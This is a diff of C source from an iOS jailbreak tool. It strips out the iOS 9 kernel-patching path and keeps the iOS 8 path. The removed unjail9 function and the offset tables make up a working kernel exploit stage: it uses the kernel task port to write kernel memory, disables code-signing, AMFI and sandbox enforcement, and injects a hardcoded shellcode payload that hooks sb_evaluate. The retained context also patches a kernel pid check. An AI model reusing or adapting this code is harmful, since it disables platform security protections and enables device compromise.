@@ -197,23 +197,6 @@ enum koffsets {
     offsetof_allproc,                  // allproc
     offsetof_p_pid,                  // proc_t::p_pid
     offsetof_p_ucred,                // proc_t::p_ucred
-    /* patchfinder90 */
-    PF9_proc_enforce,
-    PF9_cs_enforcement_disable_amfi,
-    PF9_PE_i_can_has_debugger_1,
-    PF9_PE_i_can_has_debugger_2,
-    PF9_p_bootargs,
-    PF9_vm_fault_enter,
-    PF9_vm_map_enter,
-    PF9_vm_map_protect,
-    PF9_mount_patch,
-    PF9_mapForIO,
-    PF9_sandbox_call_i_can_has_debugger,
-    PF9_sb_patch,
-    PF9_memcmp_addr,
-    PF9_vn_getpath,
-    PF9_csops_addr,
-    PF9_amfi_file_check_mmap,
 };
 
 uint32_t koffsets_S5L895xX_12H321[] = {
@@ -236,23 +219,6 @@ uint32_t koffsets_S5L895xX_12H321[] = {
     0x3f9970,   // allproc
     0x8,        // proc_t::p_pid
     0x8c,       // proc_t::p_ucred
-    
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
 };
 
 uint32_t koffsets_S5L894xX_12H321[] = {
@@ -275,65 +241,7 @@ uint32_t koffsets_S5L894xX_12H321[] = {
     0x3F4810,   // allproc
     0x8,        // proc_t::p_pid
     0x8c,       // proc_t::p_ucred
-    
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
-    0,
 };
-
-#ifndef IOS_VIII_UNTETHER
-uint32_t koffsets_S5L8950X_13A452[] = {
-    0x31e7bc,   // OSSerializer::serialize
-    0x320f00,   // OSSymbol::getMetaClass
-    0x1e718,    // calend_gettime
-    0xde9fc,    // _bufattr_cpx
-    0x40a3cc,   // clock_ops
-    0xcb87c,    // _copyin
-    0xde9fe,    // BX LR
-    0xcb5a8,    // write_gadget: str r1, [r0, #0xc] , bx lr
-    0x45c0c4,   // vm_kernel_addrperm
-    0x3fd444,   // kernel_pmap
-    0xbf5ac,    // flush_dcache
-    0xcb600,    // invalidate_tlb
-    0x302bdc,   // task_for_pid
-    0x18+2,       // pid_check_addr offset
-    0x40,       // posix_check_ret_addr offset
-    0x224,      // mac_proc_check_ret_addr offset
-    0x45d9b0,   // allproc
-    0x8,        // proc_t::p_pid
-    0x8c,       // proc_t::p_ucred
-    
-    0x8040b0d0, // proc_enforce
-    0x80773be9, // cs_enforcement_disable_amfi
-    0x803b0014, // PE_i_can_has_debugger_1
-    0x8045d8f0, // PE_i_can_has_debugger_2
-    0x80461de0, // p_bootargs
-    0x80078fa8, // vm_fault_enter
-    0x80080478, // vm_map_enter
-    0x80081e22, // vm_map_protect
-    0x800f5b65, // mount_patch
-    0x80bd5a22, // mapForIO
-    0x80e55e90, // sandbox_call_i_can_has_debugger
-    0x80e52948, // sb_patch
-    0x800c5125, // memcmp_addr
-    0x800f0211, // vn_getpath
-    0x802af740, // csops_addr
-    0x8075765a, // amfi_file_check_mmap
-};
-#endif
 
 uint32_t koffset(enum koffsets offset){
     if (offsets == NULL) {
@@ -374,13 +282,6 @@ void offsets_init(void){
         printf("S5L8945X: 12H321\n");
         offsets = koffsets_S5L894xX_12H321;
     }
-#ifndef IOS_VIII_UNTETHER
-    if (strcmp(u.version, "Darwin Kernel Version 15.0.0: Thu Aug 20 13:11:13 PDT 2015; root:xnu-3248.1.3~1/RELEASE_ARM_S5L8950X") == 0) {
-        printf("S5L8950X: 13A452\n");
-        offsets = koffsets_S5L8950X_13A452;
-        isIOS9 = 1;
-    }
-#endif
 }
 
 void init(void){
@@ -795,13 +696,7 @@ void do_exploit(uint32_t kernel_base){
     
     patch_page_table(1, tte_virt, tte_phys, flush_dcache, invalidate_tlb, pid_check_addr & ~0xFFF);
     
-    //if(!isIOS9){
-    //    uint32_t pid_check_val = read_primitive(pid_check_addr);
-    //    pid_check_val |= 0xff;
-    //    write_primitive(pid_check_addr, pid_check_val); // cmp r6, #ff
-    //} else {
-        write_primitive(pid_check_addr, 0xbf00bf00); // beq -> NOP
-    //}
+    write_primitive(pid_check_addr, 0xbf00bf00); // beq -> NOP
     
     usleep(100000);
     
@@ -1092,185 +987,7 @@ void unjail8(uint32_t kbase){
     
 }
 
-#ifndef IOS_VIII_UNTETHER
-void unjail9(uint32_t kbase, uint32_t slide){
-    printf("[*] jailbreaking...\n");
-    
-    /* Probably not working *
-    printf("[*] running kdumper\n");
-    size_t ksize = 0xF00000;
-    void *kdata = malloc(ksize);
-    dump_kernel(kbase, kdata, ksize);
-     
-    * patchfinder *
-    printf("[*] running patchfinder\n");
-    uint32_t proc_enforce = kbase + find_proc_enforce(kbase, kdata, ksize);
-    uint32_t cs_enforcement_disable_amfi = kbase + find_cs_enforcement_disable_amfi(kbase, kdata, ksize);
-    uint32_t PE_i_can_has_debugger_1 = kbase + find_i_can_has_debugger_1_90(kbase, kdata, ksize);
-    uint32_t PE_i_can_has_debugger_2 = kbase + find_i_can_has_debugger_2_90(kbase, kdata, ksize);
-    uint32_t p_bootargs = kbase + find_p_bootargs_generic(kbase, kdata, ksize);
-    uint32_t vm_fault_enter = kbase + find_vm_fault_enter_patch(kbase, kdata, ksize);
-    uint32_t vm_map_enter = kbase + find_vm_map_enter_patch(kbase, kdata, ksize);
-    uint32_t vm_map_protect = kbase + find_vm_map_protect_patch(kbase, kdata, ksize);
-    uint32_t mount_patch = kbase + find_mount_90(kbase, kdata, ksize) + 1;
-    uint32_t mapForIO = kbase + find_mapForIO(kbase, kdata, ksize);
-    uint32_t sandbox_call_i_can_has_debugger = kbase + find_sandbox_call_i_can_has_debugger(kbase, kdata, ksize);
-    uint32_t sb_patch = kbase + find_sb_evaluate_90(kbase, kdata, ksize);
-    uint32_t memcmp_addr = find_memcmp(kbase, kdata, ksize);
-    uint32_t vn_getpath = find_vn_getpath(kbase, kdata, ksize);
-    uint32_t csops_addr = kbase + find_csops(kbase, kdata, ksize);
-    uint32_t amfi_file_check_mmap = kbase + find_amfi_file_check_mmap(kbase, kdata, ksize);
-    */
-    
-    uint32_t proc_enforce                       = koffset(PF9_proc_enforce)                    + slide;
-    uint32_t cs_enforcement_disable_amfi        = koffset(PF9_cs_enforcement_disable_amfi)     + slide;
-    uint32_t PE_i_can_has_debugger_1            = koffset(PF9_PE_i_can_has_debugger_1)         + slide;
-    uint32_t PE_i_can_has_debugger_2            = koffset(PF9_PE_i_can_has_debugger_2)         + slide;
-    uint32_t p_bootargs                         = koffset(PF9_p_bootargs)                      + slide;
-    uint32_t vm_fault_enter                     = koffset(PF9_vm_fault_enter)                  + slide;
-    uint32_t vm_map_enter                       = koffset(PF9_vm_map_enter)                    + slide;
-    uint32_t vm_map_protect                     = koffset(PF9_vm_map_protect)                  + slide;
-    uint32_t mount_patch                        = koffset(PF9_mount_patch)                     + slide;
-    uint32_t mapForIO                           = koffset(PF9_mapForIO)                        + slide;
-    uint32_t sandbox_call_i_can_has_debugger    = koffset(PF9_sandbox_call_i_can_has_debugger) + slide;
-    uint32_t csops_addr                         = koffset(PF9_csops_addr)                      + slide;
-    uint32_t amfi_file_check_mmap               = koffset(PF9_amfi_file_check_mmap)            + slide;
-    uint32_t sb_patch                           = koffset(PF9_sb_patch)                        + slide;
-    uint32_t memcmp_addr                        = koffset(PF9_memcmp_addr)       - KERNEL_BASE_ADDRESS;
-    uint32_t vn_getpath                         = koffset(PF9_vn_getpath)        - KERNEL_BASE_ADDRESS;
-    
-    printf("[PF] proc_enforce:               %08x\n", proc_enforce);
-    printf("[PF] cs_enforcement_disable:     %08x\n", cs_enforcement_disable_amfi);
-    printf("[PF] PE_i_can_has_debugger_1:    %08x\n", PE_i_can_has_debugger_1);
-    printf("[PF] PE_i_can_has_debugger_2:    %08x\n", PE_i_can_has_debugger_2);
-    printf("[PF] p_bootargs:                 %08x\n", p_bootargs);
-    printf("[PF] vm_fault_enter:             %08x\n", vm_fault_enter);
-    printf("[PF] vm_map_enter:               %08x\n", vm_map_enter);
-    printf("[PF] vm_map_protect:             %08x\n", vm_map_protect);
-    printf("[PF] mount_patch:                %08x\n", mount_patch);
-    printf("[PF] mapForIO:                   %08x\n", mapForIO);
-    printf("[PF] sb_call_i_can_has_debugger: %08x\n", sandbox_call_i_can_has_debugger);
-    printf("[PF] sb_evaluate:                %08x\n", sb_patch);
-    printf("[PF] memcmp:                     %08x\n", memcmp_addr);
-    printf("[PF] vn_getpath:                 %08x\n", vn_getpath);
-    printf("[PF] csops:                      %08x\n", csops_addr);
-    printf("[PF] amfi_file_check_mmap:       %08x\n", amfi_file_check_mmap);
-    
-    printf("[*] running kernelpatcher\n");
-    
-    /* proc_enforce: -> 0 */
-    write_primitive_dword_tfp0(proc_enforce, 0);
-    
-    /* cs_enforcement_disable = 1 && amfi_get_out_of_my_way = 1 */
-    write_primitive_byte_tfp0(cs_enforcement_disable_amfi, 1);
-    write_primitive_byte_tfp0(cs_enforcement_disable_amfi-1, 1);
-    
-    /* bootArgs */
-    patch_bootargs(p_bootargs);
-    
-    /* debug_enabled -> 1 */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (PE_i_can_has_debugger_1 & ~0xFFF));
-    write_primitive_dword_tfp0(PE_i_can_has_debugger_1, 1);
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (PE_i_can_has_debugger_2 & ~0xFFF));
-    write_primitive_dword_tfp0(PE_i_can_has_debugger_2, 1);
-    
-    /* vm_fault_enter */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_fault_enter & ~0xFFF));
-    write_primitive_word_tfp0(vm_fault_enter, 0x2201);
-    
-    /* vm_map_enter */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_enter & ~0xFFF));
-    write_primitive_dword_tfp0(vm_map_enter, 0xbf00bf00);
-    
-    /* vm_map_protect: set NOP */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (vm_map_protect & ~0xFFF));
-    write_primitive_dword_tfp0(vm_map_protect, 0xbf00bf00);
-    
-    /* mount patch */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mount_patch & ~0xFFF));
-    write_primitive_byte_tfp0(mount_patch, 0xe7);
-    
-    /* mapForIO: prevent kIOReturnLockedWrite error */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (mapForIO & ~0xFFF));
-    write_primitive_dword_tfp0(mapForIO, 0xbf00bf00);
-    
-    /* csops */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (csops_addr & ~0xFFF));
-    write_primitive_dword_tfp0(csops_addr, 0xbf00bf00);
-    
-    /* amfi_file_check_mmap */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (amfi_file_check_mmap & ~0xFFF));
-    write_primitive_dword_tfp0(amfi_file_check_mmap, 0xbf00bf00);
-    
-    /* sandbox */
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sandbox_call_i_can_has_debugger & ~0xFFF));
-    write_primitive_dword_tfp0(sandbox_call_i_can_has_debugger, 0xbf00bf00);
-    
-    /* sb_evaluate */
-    unsigned char pangu9_payload[] = {
-        0x1f, 0xb5, 0xad, 0xf5, 0x82, 0x6d, 0x1c, 0x6b, 0x01, 0x2c, 0x34, 0xd1,
-        0x5c, 0x6b, 0x00, 0x2c, 0x31, 0xd0, 0x69, 0x46, 0x5f, 0xf4, 0x80, 0x60,
-        0x0d, 0xf5, 0x80, 0x62, 0x10, 0x60, 0x20, 0x46, 0x11, 0x11, 0x11, 0x11,
-        0x1c, 0x28, 0x01, 0xd0, 0x00, 0x28, 0x24, 0xd1, 0x68, 0x46, 0x17, 0xa1,
-        0x10, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28, 0x1d, 0xd0, 0x68, 0x46,
-        0x0f, 0xf2, 0x5c, 0x01, 0x13, 0x22, 0x22, 0x22, 0x22, 0x22, 0x00, 0x28,
-        0x0d, 0xd1, 0x68, 0x46, 0x18, 0xa1, 0x31, 0x22, 0x22, 0x22, 0x22, 0x22,
-        0x00, 0x28, 0x0e, 0xd0, 0x68, 0x46, 0x22, 0xa1, 0x27, 0x22, 0x22, 0x22,
-        0x22, 0x22, 0x00, 0x28, 0x07, 0xd1, 0x0d, 0xf5, 0x82, 0x6d, 0x01, 0xbc,
-        0x00, 0x21, 0x01, 0x60, 0x18, 0x21, 0x01, 0x71, 0x1e, 0xbd, 0x0d, 0xf5,
-        0x82, 0x6d, 0x05, 0x98, 0x86, 0x46, 0x1f, 0xbc, 0x01, 0xb0, 0xcc, 0xcc,
-        0xcc, 0xcc, 0xdd, 0xdd, 0xdd, 0xdd, 0x00, 0xbf, 0x2f, 0x70, 0x72, 0x69,
-        0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72, 0x2f, 0x74, 0x6d, 0x70,
-        0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72,
-        0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x00, 0x2f, 0x70, 0x72, 0x69,
-        0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72, 0x2f, 0x6d, 0x6f, 0x62,
-        0x69, 0x6c, 0x65, 0x2f, 0x4c, 0x69, 0x62, 0x72, 0x61, 0x72, 0x79, 0x2f,
-        0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6e, 0x63, 0x65, 0x73, 0x2f,
-        0x63, 0x6f, 0x6d, 0x2e, 0x61, 0x70, 0x70, 0x6c, 0x65, 0x00, 0x00, 0xbf,
-        0x2f, 0x70, 0x72, 0x69, 0x76, 0x61, 0x74, 0x65, 0x2f, 0x76, 0x61, 0x72,
-        0x2f, 0x6d, 0x6f, 0x62, 0x69, 0x6c, 0x65, 0x2f, 0x4c, 0x69, 0x62, 0x72,
-        0x61, 0x72, 0x79, 0x2f, 0x50, 0x72, 0x65, 0x66, 0x65, 0x72, 0x65, 0x6e,
-        0x63, 0x65, 0x73, 0x00, 0x02, 0x00, 0x00, 0x00
-    };
-    
-    uint32_t payload_base = 0xb00; // taig8
-    size_t payload_len = 0x110;
-    
-    uint32_t vn_getpath_bl = make_bl(payload_base+0x20, vn_getpath);
-    uint32_t memcmp_bl_1 = make_bl(payload_base+0x32, memcmp_addr);
-    uint32_t memcmp_bl_2 = make_bl(payload_base+0x42, memcmp_addr);
-    uint32_t memcmp_bl_3 = make_bl(payload_base+0x50, memcmp_addr);
-    uint32_t memcmp_bl_4 = make_bl(payload_base+0x5e, memcmp_addr);
-    uint32_t sb_evaluate_val = read_primitive_dword_tfp0(sb_patch);
-    uint32_t back_sb_evaluate = make_b_w(payload_base+0x86, (sb_patch+4-kbase));
-    
-    *(uint32_t*)(pangu9_payload+0x20) = vn_getpath_bl;
-    *(uint32_t*)(pangu9_payload+0x32) = memcmp_bl_1;
-    *(uint32_t*)(pangu9_payload+0x42) = memcmp_bl_2;
-    *(uint32_t*)(pangu9_payload+0x50) = memcmp_bl_3;
-    *(uint32_t*)(pangu9_payload+0x5e) = memcmp_bl_4;
-    *(uint32_t*)(pangu9_payload+0x82) = sb_evaluate_val;
-    *(uint32_t*)(pangu9_payload+0x86) = back_sb_evaluate;
-    
-    void* sandbox_payload = malloc(payload_len);
-    memcpy(sandbox_payload, pangu9_payload, payload_len);
-    
-    // hook sb_evaluate
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, ((kbase + payload_base) & ~0xFFF));
-    copyout((kbase + payload_base), sandbox_payload, payload_len);
-    
-    uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
-    patch_page_table(0, tte_virt, tte_phys, flush_dcache, invalidate_tlb, (sb_patch & ~0xFFF));
-    write_primitive_dword_tfp0(sb_patch, sb_evaluate_hook);
-    
-    exec_primitive(flush_dcache, 0, 0);
-    
-    printf("enable patched.\n");
-    
-}
-#endif
-
-void load_jb(int isIOS9){
+void load_jb(void){
     
     // remount rootfs
     printf("[*] remounting rootfs\n");
@@ -1330,9 +1047,6 @@ void load_jb(int isIOS9){
     
     jl = "/usr/libexec/CrashHousekeeping_o";
     posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, NULL }, NULL);
-    if(isIOS9){
-        waitpid(pd, NULL, 0);
-    }
     
 #endif
     
@@ -1364,14 +1078,9 @@ int main(void){
     if(tfp0){
         printf("[*] got tfp0: %x\n", tfp0);
         
-        if(!isIOS9){
-            unjail8(kernel_base);
-        } else {
-#ifndef IOS_VIII_UNTETHER
-            unjail9(kernel_base, (uint32_t)(kernel_base - KERNEL_BASE_ADDRESS));
-#endif
-        }
-        load_jb(isIOS9);
+        unjail8(kernel_base);
+        
+        load_jb();
         
     } else {
         printf("[-] Failed to get tfp0\n");
